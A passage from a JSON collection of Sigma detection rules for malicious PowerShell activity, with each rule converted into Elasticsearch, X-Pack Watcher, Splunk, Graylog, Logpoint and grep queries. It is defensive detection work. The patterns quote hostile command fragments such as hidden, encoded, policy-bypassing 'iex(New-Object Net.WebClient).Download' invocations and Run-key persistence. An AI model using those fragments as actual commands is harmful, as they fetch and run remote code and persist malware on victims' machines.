rule"}, {"query": "title: PowerShell Credential Prompt\nid: ca8b77a9-d499-4095-b793-5d5f330d450e\nstatus: experimental\ndescription: Detects PowerShell calling a credential prompt\nreferences:\n    - https://twitter.com/JohnLaTwC/status/850381440629981184\n    - https://t.co/ezOTGy1a1G\ntags:\n    - attack.execution\n    - attack.credential_access    \n    - attack.t1086\nauthor: John Lambert (idea), Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'Script block logging must be enabled'\ndetection:\n    selection:\n        EventID: 4104\n    keyword:\n        Message:\n            - '*PromptForCredential*'\n    condition: all of them\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4104\" AND Message.keyword:(*PromptForCredential*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PowerShell-Credential-Prompt <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PowerShell Credential Prompt\",\\n    \"description\": \"Detects PowerShell calling a credential prompt\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.credential_access\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4104\\\\\" AND Message.keyword:(*PromptForCredential*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4104\\\\\" AND Message.keyword:(*PromptForCredential*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PowerShell Credential Prompt\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4104\" AND Message.keyword:(*PromptForCredential*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4104\" (Message=\"*PromptForCredential*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"4104\" Message IN [\"*PromptForCredential*\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4104)(?=.*(?:.*.*PromptForCredential.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: PowerShell PSAttack\nid: b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5\nstatus: experimental\ndescription: Detects the use of PSAttack PowerShell hack tool\nreferences:\n    - https://adsecurity.org/?p=2921\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Sean Metcalf (source), Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277'\ndetection:\n    selection:\n        EventID: 4103\n    keyword: \n        - 'PS ATTACK!!!'\n    condition: all of them\nfalsepositives:\n    - Pentesters\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: PowerShell PSAttack\nid: b7ec41a4-042c-4f31-a5db-d0fcde9fa5c5\nstatus: experimental\ndescription: Detects the use of PSAttack PowerShell hack tool\nreferences:\n    - https://adsecurity.org/?p=2921\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Sean Metcalf (source), Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\n    definition: 'It is recommended to use the new \"Script Block Logging\" of PowerShell v5 https://adsecurity.org/?p=2277'\ndetection:\n    selection:\n        EventID: 4103\n    keyword: \n        - 'PS ATTACK!!!'\n    condition: all of them\nfalsepositives:\n    - Pentesters\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"4103\" AND \"PS\\\\ ATTACK\\\\!\\\\!\\\\!\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PowerShell-PSAttack <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PowerShell PSAttack\",\\n    \"description\": \"Detects the use of PSAttack PowerShell hack tool\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4103\\\\\" AND \\\\\"PS\\\\\\\\ ATTACK\\\\\\\\!\\\\\\\\!\\\\\\\\!\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4103\\\\\" AND \\\\\"PS\\\\\\\\ ATTACK\\\\\\\\!\\\\\\\\!\\\\\\\\!\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PowerShell PSAttack\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"4103\" AND \"PS ATTACK\\\\!\\\\!\\\\!\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"4103\" \"PS ATTACK!!!\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"4103\" \"PS ATTACK!!!\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*4103)(?=.*PS ATTACK!!!))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: PowerShell ShellCode\nid: 16b37b70-6fcf-4814-a092-c36bd3aafcbd\nstatus: experimental\ndescription: Detects Base64 encoded Shellcode\nreferences:\n    - https://twitter.com/cyb3rops/status/1063072865992523776\ntags:\n    - attack.privilege_escalation\n    - attack.execution\n    - attack.t1055\n    - attack.t1086\nauthor: David Ledbetter (shellcode), Florian Roth (rule)\ndate: 2018/11/17\nlogsource:\n    product: windows\n    service: powershell\n    description: 'Script block logging must be enabled'\ndetection:\n    selection:\n        EventID: 4104\n    keyword1: \n        - '*AAAAYInlM*'\n    keyword2: \n        - '*OiCAAAAYInlM*'\n        - '*OiJAAAAYInlM*'\n    condition: selection and keyword1 and keyword2\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: PowerShell ShellCode\nid: 16b37b70-6fcf-4814-a092-c36bd3aafcbd\nstatus: experimental\ndescription: Detects Base64 encoded Shellcode\nreferences:\n    - https://twitter.com/cyb3rops/status/1063072865992523776\ntags:\n    - attack.privilege_escalation\n    - attack.execution\n    - attack.t1055\n    - attack.t1086\nauthor: David Ledbetter (shellcode), Florian Roth (rule)\ndate: 2018/11/17\nlogsource:\n    product: windows\n    service: powershell\n    description: 'Script block logging must be enabled'\ndetection:\n    selection:\n        EventID: 4104\n    keyword1: \n        - '*AAAAYInlM*'\n    keyword2: \n        - '*OiCAAAAYInlM*'\n        - '*OiJAAAAYInlM*'\n    condition: selection and keyword1 and keyword2\nfalsepositives:\n    - Unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((EventID:\"4104\" AND \"*AAAAYInlM*\") AND \\\\*.keyword:(*OiCAAAAYInlM* OR *OiJAAAAYInlM*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/PowerShell-ShellCode <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"PowerShell ShellCode\",\\n    \"description\": \"Detects Base64 encoded Shellcode\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.execution\",\\n      \"attack.t1055\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"((EventID:\\\\\"4104\\\\\" AND \\\\\"*AAAAYInlM*\\\\\") AND \\\\\\\\*.keyword:(*OiCAAAAYInlM* OR *OiJAAAAYInlM*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"4104\\\\\" AND \\\\\"*AAAAYInlM*\\\\\") AND \\\\\\\\*.keyword:(*OiCAAAAYInlM* OR *OiJAAAAYInlM*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'PowerShell ShellCode\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"4104\" AND \"*AAAAYInlM*\") AND \\\\*.keyword:(*OiCAAAAYInlM* OR *OiJAAAAYInlM*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4104\" \"*AAAAYInlM*\") (\"*OiCAAAAYInlM*\" OR \"*OiJAAAAYInlM*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((event_id=\"4104\" \"*AAAAYInlM*\") (\"*OiCAAAAYInlM*\" OR \"*OiJAAAAYInlM*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*4104)(?=.*.*AAAAYInlM.*)))(?=.*(?:.*(?:.*.*OiCAAAAYInlM.*|.*.*OiJAAAAYInlM.*))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious PowerShell Download\nid: 65531a81-a694-4e31-ae04-f8ba5bc33759\nstatus: experimental\ndescription: Detects suspicious PowerShell download command\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    keywords:\n        Message:\n            - '*System.Net.WebClient).DownloadString(*'\n            - '*system.net.webclient).downloadfile(*'\n    condition: keywords\nfalsepositives:\n    - PowerShell scripts that download content from the Internet\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious PowerShell Download\nid: 65531a81-a694-4e31-ae04-f8ba5bc33759\nstatus: experimental\ndescription: Detects suspicious PowerShell download command\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    keywords:\n        Message:\n            - '*System.Net.WebClient).DownloadString(*'\n            - '*system.net.webclient).downloadfile(*'\n    condition: keywords\nfalsepositives:\n    - PowerShell scripts that download content from the Internet\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Message.keyword:(*System.Net.WebClient\\\\).DownloadString\\\\(* OR *system.net.webclient\\\\).downloadfile\\\\(*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-PowerShell-Download <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious PowerShell Download\",\\n    \"description\": \"Detects suspicious PowerShell download command\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"Message.keyword:(*System.Net.WebClient\\\\\\\\).DownloadString\\\\\\\\(* OR *system.net.webclient\\\\\\\\).downloadfile\\\\\\\\(*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Message.keyword:(*System.Net.WebClient\\\\\\\\).DownloadString\\\\\\\\(* OR *system.net.webclient\\\\\\\\).downloadfile\\\\\\\\(*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious PowerShell Download\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Message.keyword:(*System.Net.WebClient\\\\).DownloadString\\\\(* *system.net.webclient\\\\).downloadfile\\\\(*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Message=\"*System.Net.WebClient).DownloadString(*\" OR Message=\"*system.net.webclient).downloadfile(*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "Message IN [\"*System.Net.WebClient).DownloadString(*\", \"*system.net.webclient).downloadfile(*\"]", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*.*System\\\\.Net\\\\.WebClient\\\\)\\\\.DownloadString\\\\(.*|.*.*system\\\\.net\\\\.webclient\\\\)\\\\.downloadfile\\\\(.*)'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious PowerShell Invocations - Generic\nid: 3d304fda-78aa-43ed-975c-d740798a49c1\nstatus: experimental\ndescription: Detects suspicious PowerShell invocation command parameters\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    encoded:\n        - ' -enc '\n        - ' -EncodedCommand '\n    hidden:\n        - ' -w hidden '\n        - ' -window hidden '\n        - ' - windowstyle hidden '\n    noninteractive:\n        - ' -noni '\n        - ' -noninteractive '\n    condition: all of them\nfalsepositives:\n    - Penetration tests\n    - Very special / sneaky PowerShell scripts\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious PowerShell Invocations - Generic\nid: 3d304fda-78aa-43ed-975c-d740798a49c1\nstatus: experimental\ndescription: Detects suspicious PowerShell invocation command parameters\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    encoded:\n        - ' -enc '\n        - ' -EncodedCommand '\n    hidden:\n        - ' -w hidden '\n        - ' -window hidden '\n        - ' - windowstyle hidden '\n    noninteractive:\n        - ' -noni '\n        - ' -noninteractive '\n    condition: all of them\nfalsepositives:\n    - Penetration tests\n    - Very special / sneaky PowerShell scripts\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(\\\\*.keyword:(*\\\\ \\\\-enc\\\\ * OR *\\\\ \\\\-EncodedCommand\\\\ *) AND \\\\*.keyword:(*\\\\ \\\\-w\\\\ hidden\\\\ * OR *\\\\ \\\\-window\\\\ hidden\\\\ * OR *\\\\ \\\\-\\\\ windowstyle\\\\ hidden\\\\ *) AND \\\\*.keyword:(*\\\\ \\\\-noni\\\\ * OR *\\\\ \\\\-noninteractive\\\\ *))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-PowerShell-Invocations---Generic <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious PowerShell Invocations - Generic\",\\n    \"description\": \"Detects suspicious PowerShell invocation command parameters\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"(\\\\\\\\*.keyword:(*\\\\\\\\ \\\\\\\\-enc\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-EncodedCommand\\\\\\\\ *) AND \\\\\\\\*.keyword:(*\\\\\\\\ \\\\\\\\-w\\\\\\\\ hidden\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-window\\\\\\\\ hidden\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-\\\\\\\\ windowstyle\\\\\\\\ hidden\\\\\\\\ *) AND \\\\\\\\*.keyword:(*\\\\\\\\ \\\\\\\\-noni\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-noninteractive\\\\\\\\ *))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(\\\\\\\\*.keyword:(*\\\\\\\\ \\\\\\\\-enc\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-EncodedCommand\\\\\\\\ *) AND \\\\\\\\*.keyword:(*\\\\\\\\ \\\\\\\\-w\\\\\\\\ hidden\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-window\\\\\\\\ hidden\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-\\\\\\\\ windowstyle\\\\\\\\ hidden\\\\\\\\ *) AND \\\\\\\\*.keyword:(*\\\\\\\\ \\\\\\\\-noni\\\\\\\\ * OR *\\\\\\\\ \\\\\\\\-noninteractive\\\\\\\\ *))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious PowerShell Invocations - Generic\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(\\\\*.keyword:(* \\\\-enc * OR * \\\\-EncodedCommand *) AND \\\\*.keyword:(* \\\\-w hidden * OR * \\\\-window hidden * OR * \\\\- windowstyle hidden *) AND \\\\*.keyword:(* \\\\-noni * OR * \\\\-noninteractive *))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((\" -enc \" OR \" -EncodedCommand \") (\" -w hidden \" OR \" -window hidden \" OR \" - windowstyle hidden \") (\" -noni \" OR \" -noninteractive \"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "((\" -enc \" OR \" -EncodedCommand \") (\" -w hidden \" OR \" -window hidden \" OR \" - windowstyle hidden \") (\" -noni \" OR \" -noninteractive \"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?:.* -enc |.* -EncodedCommand )))(?=.*(?:.*(?:.* -w hidden |.* -window hidden |.* - windowstyle hidden )))(?=.*(?:.*(?:.* -noni |.* -noninteractive ))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious PowerShell Invocations - Specific\nid: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\nstatus: experimental\ndescription: Detects suspicious PowerShell invocation command parameters\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    keywords:\n        Message:\n            - '* -nop -w hidden -c * [Convert]::FromBase64String*'\n            - '* -w hidden -noni -nop -c \"iex(New-Object*'\n            - '* -w hidden -ep bypass -Enc*'\n            - '*powershell.exe reg add HKCU\\software\\microsoft\\windows\\currentversion\\run*'\n            - '*bypass -noprofile -windowstyle hidden (new-object system.net.webclient).download*'\n            - '*iex(New-Object Net.WebClient).Download*'\n    condition: keywords\nfalsepositives:\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious PowerShell Invocations - Specific\nid: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\nstatus: experimental\ndescription: Detects suspicious PowerShell invocation command parameters\ntags:\n    - attack.execution\n    - attack.t1086\nauthor: Florian Roth (rule)\nlogsource:\n    product: windows\n    service: powershell\ndetection:\n    keywords:\n        Message:\n            - '* -nop -w hidden -c * [Convert]::FromBase64String*'\n            - '* -w hidden -noni -nop -c \"iex(New-Object*'\n            - '* -w hidden -ep bypass -Enc*'\n            - '*powershell.exe reg add HKCU\\software\\microsoft\\windows\\currentversion\\run*'\n            - '*bypass -noprofile -windowstyle hidden (new-object system.net.webclient).download*'\n            - '*iex(New-Object Net.WebClient).Download*'\n    condition: keywords\nfalsepositives:\n    - Penetration tests\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Message.keyword:(*\\\\ \\\\-nop\\\\ \\\\-w\\\\ hidden\\\\ \\\\-c\\\\ *\\\\ \\\\[Convert\\\\]\\\\:\\\\:FromBase64String* OR *\\\\ \\\\-w\\\\ hidden\\\\ \\\\-noni\\\\ \\\\-nop\\\\ \\\\-c\\\\ \\\\\"iex\\\\(New\\\\-Object* OR *\\\\ \\\\-w\\\\ hidden\\\\ \\\\-ep\\\\ bypass\\\\ \\\\-Enc* OR *powershell.exe\\\\ reg\\\\ add\\\\ HKCU\\\\\\\\software\\\\\\\\microsoft\\\\\\\\windows\\\\\\\\currentversion\\\\\\\\run* OR *bypass\\\\ \\\\-noprofile\\\\ \\\\-windowstyle\\\\ hidden\\\\ \\\\(new\\\\-object\\\\ system.net.webclient\\\\).download* OR *iex\\\\(New\\\\-Object\\\\ Net.WebClient\\\\).Download*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-PowerShell-Invocations---Specific <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious PowerShell Invocations - Specific\",\\n    \"description\": \"Detects suspicious PowerShell invocation command parameters\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1086\"\\n    ],\\n    \"query\": \"Message.keyword:(*\\\\\\\\ \\\\\\\\-nop\\\\\\\\ \\\\\\\\-w\\\\\\\\ hidden\\\\\\\\ \\\\\\\\-c\\\\\\\\ *\\\\\\\\ \\\\\\\\[Convert\\\\\\\\]\\\\\\\\:\\\\\\\\:FromBase64String* OR *\\\\\\\\ \\\\\\\\-w\\\\\\\\ hidden\\\\\\\\ \\\\\\\\-noni\\\\\\\\ \\\\\\\\-nop\\\\\\\\ \\\\\\\\-c\\\\\\\\ \\\\\\\\\\\\\"iex\\\\\\\\(New\\\\\\\\-Object* OR *\\\\\\\\ \\\\\\\\-w\\\\\\\\ hidden\\\\\\\\ \\\\\\\\-ep\\\\\\\\ bypass\\\\\\\\ \\\\\\\\-Enc* OR *powershell.exe\\\\\\\\ reg\\\\\\\\ add\\\\\\\\ HKCU\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\microsoft\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\currentversion\\\\\\\\\\\\\\\\run* OR *bypass\\\\\\\\ \\\\\\\\-noprofile\\\\\\\\ \\\\\\\\-windowstyle\\\\\\\\ hidden\\\\\\\\ \\\\\\\\(new\\\\\\\\-object\\\\\\\\ system.net.webclient\\\\\\\\).download* OR *iex\\\\\\\\(New\\\\\\\\-Object\\\\\\\\ Net.WebClient\\\\\\\\).Download*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Message.keyword:(*\\\\\\\\ \\\\\\\\-nop\\\\\\\\ \\\\\\\\-w\\\\\\\\ hidden\\\\\\\\ \\\\\\\\-c\\\\\\\\ *\\\\\\\\ \\\\\\\\[Convert\\\\\\\\]\\\\\\\\:\\\\\\\\:FromBase64String* OR *\\\\\\\\ \\\\\\\\-w\\\\\\\\ hidden\\\\\\\\ \\\\\\\\-noni\\\\\\\\ \\\\\\\\-nop\\\\\\\\ \\\\\\\\-c\\\\\\\\ \\\\\\\\\\\\\"iex\\\\\\\\(New\\\\\\\\-Object* OR *\\\\\\\\ \\\\\\\\-w\\\\\\\\ hidden\\\\\\\\ \\\\\\\\-ep\\\\\\\\ bypass\\\\\\\\ \\\\\\\\-Enc* OR *powershell.exe\\\\\\\\ reg\\\\\\\\ add\\\\\\\\ HKCU\\\\\\\\\\\\\\\\software\\\\\\\\\\\\\\\\microsoft\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\currentversion\\\\\\\\\\\\\\\\run* OR *bypass\\\\\\\\ \\\\\\\\-noprofile\\\\\\\\ \\\\\\\\-windowstyle\\\\\\\\ hidden\\\\\\\\ \\\\\\\\(new\\\\\\\\-object\\\\\\\\ system.net.webclient\\\\\\\\).download* OR *iex\\\\\\\\(New\\\\\\\\-Object\\\\\\\\ Net.WebClient\\\\\\\\).Download*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious PowerShell Invocations - Specific\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Message.keyword:(* \\\\-nop \\\\-w hidden \\\\-c * \\\\[Convert\\\\]\\\\:\\\\:FromBase64String* * \\\\-w hidden \\\\-noni \\\\-nop \\\\-c \\\\\"iex\\\\(New\\\\-Object* * \\\\-w hidden \\\\-ep bypass \\\\-Enc* *powershell.exe reg add 